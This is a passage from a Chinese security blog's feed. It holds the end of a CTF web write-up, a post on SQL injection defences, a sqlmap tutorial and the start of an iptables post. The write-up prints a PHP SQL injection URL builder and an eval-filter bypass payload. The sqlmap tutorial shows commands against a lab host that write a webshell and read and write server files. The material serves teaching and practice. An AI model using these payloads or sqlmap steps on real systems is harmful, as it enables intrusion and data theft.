class="line">1</span><br></pre></td><td class="code"><pre><span class="line">character_set_client -&gt; character_set_connection -&gt; 内部操作字符集</span><br></pre></td></tr></table></figure><p>而且p神说的在MySQL里面的utf-8是阉割版，最长只支持三个字节，<br>如果你需要Mysql支持四字节的utf-8，可以使用utf8mb4编码。<br>但是这个点跟这题无关，这个点用在让数据库误认为该字母不存在直接舍弃掉的情况</p><p>第二个点是<br>mysql 有两个支持 unicode 的 character set:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ucs2: 使用 16 bits 来表示一个 unicode 字符。</span><br><span class="line">utf8: 使用 1~3 bytes 来表示一个 unicode 字符。</span><br></pre></td></tr></table></figure><p>而在本题目中，sql文件中显示</p><p><code>ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></p><p>很显然这里是utf8，而我们一般数据库默认使用的是utf8_general_ci，而ci是指case insensitive的缩写，即大小写不敏感</p><p>这样也表明了为什么平常我们在cmd命令行下写数据库命令不区分大小写了</p><p>根据方方土学长所说的，这种模式由于diacritic ordering的排序问题使得读音符号最后被认定为英文字母</p><p>也就是对于utf8_general_ci，认为以下样例是相等的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ä = A</span><br><span class="line">Ö = O</span><br><span class="line">Ü = U</span><br></pre></td></tr></table></figure><p>而且还给出了这个超级腻害的表<br><a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html" target="_blank" rel="noopener">http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html</a><br>表格上方是 unicode 编码，下方是 utf8 编码</p><p>然后构造一下admin还有guest</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin: %C3%A4%C4%8F%E1%B8%BF%C3%AF%C3%B1</span><br><span class="line">guest: %C4%9D%C3%B9%C3%A8%C5%9B%C5%A3</span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$vps_ip = <span class="string">'你的vps地址'</span>;</span><br><span class="line">$time = time();</span><br><span class="line">    $url = <span class="string">"http://cheaplottery.solveme.peng.kr/index.php?lottery%5BA%5D=1'),('%C3%A4%C4%8F%E1%B8%BF%C3%AF%C3%B1_"</span>.$vps_ip.<span class="string">"','&#123;$time&#125;','1,1,1,1,1'),('%C4%9D%C3%B9%C3%A8%C5%9B%C5%A3_"</span>.$vps_ip.<span class="string">"','&#123;$time&#125;','1,1,1,1,1')%23&amp;lottery%5BB%5D=&amp;lottery%5BC%5D=&amp;lottery%5BD%5D=&amp;lottery%5BE%5D="</span>;</span><br><span class="line">    <span class="keyword">echo</span> $url;</span><br></pre></td></tr></table></figure><p>然后在你的vps上再curl一下就得到flag了</p><p><a href="https://imgchr.com/i/P2t4AI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P2t4AI.md.png" alt="P2t4AI.md.png"></a></p><h3 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    $exam = <span class="string">'return\''</span>.sha1(time()).<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="./?flag='</span>.$exam.<span class="string">'"&gt;Click here&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'flag'</span>]) != strlen($exam)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed length'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is'</span>, $_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed keyword'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">'flag'</span>]) === sha1($flag)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'What\'s going on?'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这段代码主要利用的是if条件里面的eval函数直接输出flag,前提是这里过滤十分强大，把所有可以执行的函数全部过滤，这时候只能利用开发的一个知识，就是<code>&lt;?=$flag?&gt;</code>,可以直接把flag里面的内容直接输出来，这东西我也是在学YII框架的时候学会的。<br>可以直接看一下文档里面有这样的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= expression ?&gt; This is a shortcut for &quot;&lt;? echo expression ?&gt;&quot;</span><br></pre></td></tr></table></figure><p>这相当于说这是一个echo的缩写版<br><a href="https://imgchr.com/i/P2tbjg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P2tbjg.md.png" alt="P2tbjg.md.png"></a><br>另外呢这两句话表明了php5.4以后都存在这样的缩写形式<br>我们现在还要考虑的是如何绕过长度的问题以及不要在payload里面存在flag这个词，所以最后的payload是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=$a=&apos;blag&apos;;$a&#123;0&#125;=&apos;f&apos;;?&gt;11111111111111111;&lt;?=$$a;?&gt;</span><br></pre></td></tr></table></figure><p>这里前面的<code>?&gt;</code>的是利用了html里面的嵌套PHP的语法，同时也为了后面的<code>&lt;?=?&gt;</code>可以顺利执行，中间的<code>1</code>就是为了满足<code>strlen</code>这个函数从而执行下面的代码</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.IP地址可以用ip2long这个函数尝试去绕过<br>2.回顾了科学计数法还有这个指数形式在bypass方面的绕过<br>3.parse_url()这个函数的几个小trick，分别是对于特殊字符会替换成_,以及在///的情况下会使后面的东西忽略从而导致绕过<br>4.关于注入这东西，灵活一些，别太死板，除了一些特殊的方法绕过以外，还可以考虑字符集(这里包括16进制)<br>5.eval函数里面的执行文件操作的函数都被过滤了，可以使用缩写输出之类<br>6.正则匹配注意一下匹配\的写法应该是四个|\\|,而且对于正则的规则以^开头$结尾的，可以%0a去bypass<br>7.还有飘零大哥的思路，代码审计拿来可能是SQL注入还有逻辑漏洞这也是很骚气的，22333</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前一阵子关注点在实战上，现在又回归CTF学习套路了，这个网站&lt;a href=&quot;http://solveme.peng.kr&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://solveme.peng.kr&lt;/a&gt; 本来做了一半的题目，今天终于把他补完了，学到了炒鸡多的东西啊
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="代码审计" scheme="0verwatch.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>浅谈SQL注入防御手段</title>
    <link href="0verwatch.top/sql-inject-protect.html"/>
    <id>0verwatch.top/sql-inject-protect.html</id>
    <published>2018-08-02T15:08:29.000Z</published>
    <updated>2018-08-14T14:44:04.855Z</updated>
    
    <content type="html"><![CDATA[<h3 id="sql语句预编译"><a href="#sql语句预编译" class="headerlink" title="sql语句预编译"></a>sql语句预编译</h3><p>例如:<a id="more"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"select id, no from user where id=?"</span>;</span><br><span class="line">      PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">      ps.setInt(<span class="number">1</span>, id);</span><br><span class="line">      ps.executeQuery();</span><br></pre></td></tr></table></figure><p>这里采用了<code>PreparedStatement</code>，就会将sql语句<code>预先编译</code>好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的 语法结构了，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如 <code>select ,from ,where ,and, or ,order by</code> 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行， 必须先的通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为sql命令来执行的，只会被当做字符串字面值参数。所以sql语句预编译可以防御sql注入</p><p>讲一下另外一个预编译，就是用PDO，这里就推荐几篇文章自己看一下，简单说一下就是原理跟上面的差不多，把执行语句和变量分开，变量分别绑定，分别传参，从而阻止了注入，只是底层不太明了，自己真菜。。<br><a href="https://segmentfault.com/q/1010000000723496" target="_blank" rel="noopener">https://segmentfault.com/q/1010000000723496</a><br><a href="http://www.cnblogs.com/zl0372/p/php_28.html" target="_blank" rel="noopener">http://www.cnblogs.com/zl0372/p/php_28.html</a><br><a href="https://blog.csdn.net/theVicTory/article/details/62884352" target="_blank" rel="noopener">https://blog.csdn.net/theVicTory/article/details/62884352</a></p><p>预编译方法就最有效！！也是如今市场上最流行的方式了</p><h3 id="检查变量数据类型和格式"><a href="#检查变量数据类型和格式" class="headerlink" title="检查变量数据类型和格式"></a>检查变量数据类型和格式</h3><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid=checkuid($uid);    <span class="comment">//检测$uid是不是数字类型,不是不继续往下运行</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;‘;</span></span><br></pre></td></tr></table></figure><p>这段语句是为了保证了id是数字类型，checkid是一个<code>自定义</code>的函数，但是千万别直接里面写一个<code>is_numeric</code>就结束了啊，这很容易就可以用16进制或者是科学计数法去绕过的，这个还是少用吧，毕竟自写函数就像是写黑名单，肯定会有纰漏的</p><h3 id="过滤特殊字符"><a href="#过滤特殊字符" class="headerlink" title="过滤特殊字符"></a>过滤特殊字符</h3><p>这个方法也相当于<code>黑名单</code>，还是少用为好，一般有纰漏就可以去绕过的了</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> boolean sql_inj(String str) </span><br><span class="line">&#123; </span><br><span class="line">String inj_str = “’|<span class="keyword">and</span>|exec|insert|select|delete|update| </span><br><span class="line">count|*|%|chr|mid|master|truncate|char|<span class="keyword">declare</span>|;|<span class="keyword">or</span>|-|+|,”; </span><br><span class="line">String inj_stra[] = split(inj_str,”|”); </span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span> ; i &lt; inj_stra.length ; i++ ) </span><br><span class="line">&#123; <span class="keyword">if</span> (str.indexOf(inj_stra[i])&gt;=<span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="keyword">true</span>; &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>黑名单只能追求全面去避免SQL注入了</p><h3 id="转译特殊符号"><a href="#转译特殊符号" class="headerlink" title="转译特殊符号"></a>转译特殊符号</h3><p>例如:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;'"</span>;</span><br></pre></td></tr></table></figure></p><p>这里就是利用了<code>addslashes</code>函数去对特殊字符进行转义，比如单引号会被转译成<code>\’</code>，所以无法闭合和注释。不能达到sql注入攻击的效果。一般在CTF题目里面如果我看到这个函数的话，我会预测有75%可能不是SQL注入，先去看看其他点是否存在漏洞</p><h3 id="从中间件配置上防止SQL注入"><a href="#从中间件配置上防止SQL注入" class="headerlink" title="从中间件配置上防止SQL注入"></a>从中间件配置上防止SQL注入</h3><p>通过启用php.ini配置文件中的<code>magic_quote_gpc (魔术字符)</code>，就可以将大部分想利用SQL注入漏洞的骇客拒绝于门外。开启<code>magic_quote_gpc=on</code>之后，能实现<code>addslshes()</code>和<code>stripslashes()</code>这两个函数的功能，这就从很大程度上防止了sql注入。<code>PHP 5.4</code> 之前 PHP 指令 <code>magic_quotes_gpc</code> 默认是 <code>on</code>， 实际上所有的 GET、POST 和 COOKIE 数据都用被 <code>addslashes()</code> 了。 不要对已经被 <code>magic_quotes_gpc</code> 转义过的字符串使用 <code>addslashes()</code>，因为这样会导致<code>双层转义</code>。 遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测<br>但是只开启<code>magic_quote_gpc</code> ，对防止sql注入是远远不够的。<br>例如以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid=&#123;$uid&#125;"</span>;</span><br></pre></td></tr></table></figure><p>在这条sql语句中并没有单引号的保护，攻击者既不需要闭合单引号也不需要注释单引号，所以gpc开启对sql注入攻击的防范并没有作用。所以说变量还是要用引号包住才好，别直接就赋值了。。。</p><h3 id="通过安全waf去防御"><a href="#通过安全waf去防御" class="headerlink" title="通过安全waf去防御"></a>通过安全waf去防御</h3><p>过安全waf达到一定程度防御,软件层面的不多说。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>总的来说，现在很多网站多不会再使用字符串拼接去查找数据库里面的内容了，大多数现在使用的是预编译，除了那些荒废的网站以及CTF题目里面会使用，那是不是说以后挖洞挖SQL注入的就比较难了233333。。。我还是太年轻了</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;sql语句预编译&quot;&gt;&lt;a href=&quot;#sql语句预编译&quot; class=&quot;headerlink&quot; title=&quot;sql语句预编译&quot;&gt;&lt;/a&gt;sql语句预编译&lt;/h3&gt;&lt;p&gt;例如:
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Sqlmap 使用方法小结</title>
    <link href="0verwatch.top/sqlmap-usage.html"/>
    <id>0verwatch.top/sqlmap-usage.html</id>
    <published>2018-08-02T14:05:38.000Z</published>
    <updated>2018-08-02T15:22:31.416Z</updated>
    
    <content type="html"><![CDATA[<p>平常的使用GET方法像–tables –columns -T -D –dbs –dump 啥的就不说了，只是博客几天不发，空着不好，还是得写写东西<a id="more"></a></p><p>前置知识<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--is-dba 当前用户权限（是否为root权限，mssql下最高权限为sa）</span><br><span class="line">--dbs 所有数据库</span><br><span class="line">--current-db 网站当前数据库</span><br><span class="line">--users 所有数据库用户</span><br><span class="line">--current-user 当前数据库用户</span><br><span class="line">--random-agent 构造随机user-agent</span><br><span class="line">--passwords 数据库密码</span><br><span class="line">--proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒</span><br><span class="line">--threads=                       使用多少线程</span><br></pre></td></tr></table></figure></p><p><code>--is-dba</code> 这个命令有时候决定了你是否可以在服务器下进行写的操作，这个很重要，是否有写的权限，代表你是否可以在服务器上面写入一句话木马</p><h3 id="利用sqlmap进行POST注入"><a href="#利用sqlmap进行POST注入" class="headerlink" title="利用sqlmap进行POST注入"></a>利用sqlmap进行POST注入</h3><p>先利用bp去抓一个包，直接发送包里面的内容保存到一个文件里面，然后用<code>-r</code>参数去实现它就好<br>例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql</span><br><span class="line">```    </span><br><span class="line">指定username参数，-dbms指定了某种数据库，这句话指定的是mysql数据库，-p指定的是参数，不指定的话每一个参数他都会尝试</span><br><span class="line">注意这句话已经不像平常那样需要`-u`参数了，直接`-r`参数即可，因为报文里面已经含有了含有应有的各种条件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 利用sqlmap进行需要登陆的注入</span><br><span class="line">可以跟上面进行post注入的一样，直接`-r`参数带上你的抓包文件路径，既然是需要登录的注入，那么报文里面肯定是要有`cookie`的</span><br><span class="line">我们还可以利用<span class="comment">--cookie参数注入，例如: </span></span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp; Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --current-db</span></span><br></pre></td></tr></table></figure><p>这里面的cookie参数可以抓包获得</p><h3 id="利用sqlmap进行交互式写shell"><a href="#利用sqlmap进行交互式写shell" class="headerlink" title="利用sqlmap进行交互式写shell"></a>利用sqlmap进行交互式写shell</h3><p>这个要利用sqlmap写shell的话前提需要获取网站的绝对路径，而且必须叙是root权限</p><p>使用burpsuite进行抓包，获取cookie。判断用户是否为dba，输入命令：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --is-dba</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g9pT.png" alt="P0g9pT.png"></p><p>  输入命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --os-shell</span></span><br></pre></td></tr></table></figure><p>  脚本类型为PHP，所以输入4<br><img src="https://s1.ax1x.com/2018/08/02/P0gC1U.png" alt="P0gC1U.png">     </p><p>   输入第二步得到的路径，这样就可以在里面写相关命令了<br><img src="https://s1.ax1x.com/2018/08/02/P0gknJ.png" alt="P0gknJ.png"></p><p><img src="https://s1.ax1x.com/2018/08/02/P0gu9K.png" alt="P0gu9K.png"><br>这时候会在绝对路径下写入2个shell，一个用来执行命令的，另一个是用来上传的，其中上传的文件名为tmpujhum.php，这个上传的文件可以去上传小马然后连接即可，这里我们注意一下，为什么会出现admin admin这样的文字，这是sqlmap用来确认是否成功写进shell的标志，后面也会提一下。他这个写进admin的方式有可能会导致利用sqlmap写文件的时候小马文件会出现乱码。猜测是写文件的方式导致了文件的乱码，我们都知道写文件的方式要么就是ASCII要么是二进制文件流方式去实现。</p><h3 id="利用sqlmap辅助手工注入"><a href="#利用sqlmap辅助手工注入" class="headerlink" title="利用sqlmap辅助手工注入"></a>利用sqlmap辅助手工注入</h3><p>其实这个就是介绍了在发现注入点之后，怎么在sqlmap里面执行SQL语句，继续用上面的例子，改一下就是这样子的，但前提我们也是要发现数据点<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --sql-query "select user(),version(),database()"</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g3Bd.png" alt="P0g3Bd.png"><br>这样就是相当于运行对应的SQL语句了。但是其实这样执行的话每一次都会对网站注入一遍，效率就比较低.<br>可以换一个方式，把<code>--sql-query</code>改为<code>--sql-shell</code>,这样一来就相当于平常我们执行SQL语句的那个cmd命令界面一样。写一条语句就直接执行一条，省去了注入的过程。</p><h3 id="利用sqlmap进行文件读写"><a href="#利用sqlmap进行文件读写" class="headerlink" title="利用sqlmap进行文件读写"></a>利用sqlmap进行文件读写</h3><p>这里可以写文件的话前提必须有<br>判断是否为<code>dba/root用户</code>，爆出了网站的绝对路径，有一个可写目录，也是用上面的案例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-read=/opt/lampp/htdocs/php.ini</span></span><br></pre></td></tr></table></figure><p>成功读取了<code>php.ini</code>文件，并返回了路径。</p><p><img src="https://s1.ax1x.com/2018/08/02/P0g8HA.png" alt="P0g8HA.png"><br> 打开如下图所示：<br>      这里的文件我们可以去sqlmap的output里面查看，也就是对应的用户文件夹里面</p><p>在服务器端写入文件<br>      输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-write C:\1.txt --file-dest /opt/lampp/htdocs/vulnerabilities/exec/1.txt</span></span><br></pre></td></tr></table></figure><p>  这里的意思就是将本地<code>C:\1.txt</code> 写入到服务器端<code>/opt/lampp/htdocs/vulnerabilities/exec/1.txt</code></p><p>打开对应文件的网站路径如下图：<br><img src="https://s1.ax1x.com/2018/08/02/P0gJAI.png" alt="P0gJAI.png">      </p><p>这里又出现了admin admin了，就是sqlmap用来确认是否写成功的标志，因为在写文件的过程中他会问是否验证，它就会以这个标志来判断啦。</p><p><img src="https://s1.ax1x.com/2018/08/02/P0gYNt.png" alt="P0gYNt.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平常的使用GET方法像–tables –columns -T -D –dbs –dump 啥的就不说了，只是博客几天不发，空着不好，还是得写写东西
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Linux防火墙学习</title>
    <link href="0verwatch.top/Linux-FW.html"/>
    <id>0verwatch.top/Linux-FW.html</id>
    <published>2018-07-29T15:32:03.000Z</published>
    <updated>2018-08-05T11:54:35.604Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux下<code>iptables</code>的设置，设置了它就能够有效地过滤掉相关的数据包从而阻挡相关攻击，感觉这个东西跟安全有很大用处，比如在我们学习的计算机网络知识里面，网络拓扑十分瓜皮，路由器没有过滤数据包的功能，直接就实现路由转发的过程，这样就会对一个LAN造成很大的安全隐患，<a id="more"></a>现在我要更正一下自己的思路，路由器不单单实现转发功能，我现在还把他看成一台可以实现过滤功能的电脑，这样就对它所连接的LAN有保护作用了，但现在一般对于网络防火墙而言很少再使用<code>iptables</code>了，现在一般都用一些大型厂商提供的防火墙。比如华3，深信服之类的，说白了就是牛逼了一点的电脑，但是对于一台服务器而言还是可以设置规则来防止别人拿下服务器的。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>netfilter</code>    ：位于Linux内核中的包过滤功能体系，称为Linux防火墙的“内核态”<br><code>iptables</code>：位于/sbin/iptables，用来管理防火墙规则的工具，称为Linux防火墙的“用户态”</p><p>—— 上述2种称呼都可以表示Linux防火墙<br>其实用户层面使用iptables也是去调用内核里面的netfilter，这是操作系统里面的知识就不多说了</p><h3 id="Linux查看防火墙状态"><a href="#Linux查看防火墙状态" class="headerlink" title="Linux查看防火墙状态"></a>Linux查看防火墙状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service iptables start 启动防火墙</span><br><span class="line">service iptables status 查看防火墙状态，还可以使用这样一条命令iptables -L --line-numbers查看较为详细的命令</span><br><span class="line">service iptables stop 停止服务</span><br></pre></td></tr></table></figure><p>如果是阿里云的主机好像没有这个服务，他是直接在网页上让你设置防火墙，这是我自己的阿里云主机，命令行界面不能设置，但是在网页端可已自行控制端口的开放以及各种规则<br><img src="https://s1.ax1x.com/2018/07/29/Pa5y1f.png" alt="Pa5y1f.png"></p><p><a href="https://imgchr.com/i/Pa5vNR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/Pa5vNR.md.png" alt="Pa5vNR.md.png"></a></p><h3 id="包过滤的工作层次"><a href="#包过滤的工作层次" class="headerlink" title="包过滤的工作层次"></a>包过滤的工作层次</h3><p>主要实现在网络层也就是对IP数据包的处理上，详细一点就是对ip地址以及端口做处理<br><a href="https://imgchr.com/i/PaI8Ej" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaI8Ej.md.png" alt="PaI8Ej.md.png"></a></p><p>下面是些先行知识，关于iptables的链表结构</p><h3 id="规则链"><a href="#规则链" class="headerlink" title="规则链"></a>规则链</h3><p>规则的作用：对数据包进行过滤或处理<br>链的作用：容纳各种防火墙规则<br>链的分类依据：处理数据包的不同时机</p><p>默认包括5种规则链<br><code>INPUT</code>：处理入站数据包<br><code>OUTPUT</code>：处理出站数据包<br><code>FORWARD</code>：处理转发数据包<br><code>POSTROUTING</code>链：在进行路由选择后处理数据包<br><code>PREROUTING</code>链：在进行路由选择前处理数据包</p><p>上面这5种规则，在现实生活中一般不是全都是使用</p><h3 id="规则表"><a href="#规则表" class="headerlink" title="规则表"></a>规则表</h3><p>表的作用：容纳各种规则链<br>表的划分依据：防火墙规则的作用相似</p><p>默认包括4个规则表<br><code>raw</code>表：确定是否对该数据包进行状态跟踪<br><code>mangle</code>表：为数据包设置标记<br><code>nat</code>表：修改数据包中的源、目标IP地址或端口<br><code>filter</code>表：确定是否放行该数据包（过滤）<br>常用的就是其中<strong>filter</strong>表<strong>nat</strong>表多用于实现ip的转化功能，这里的表功能个人感觉相当于链下面的表功能，每种链都存在这四种表</p><h3 id="规则表之间的默认优先级"><a href="#规则表之间的默认优先级" class="headerlink" 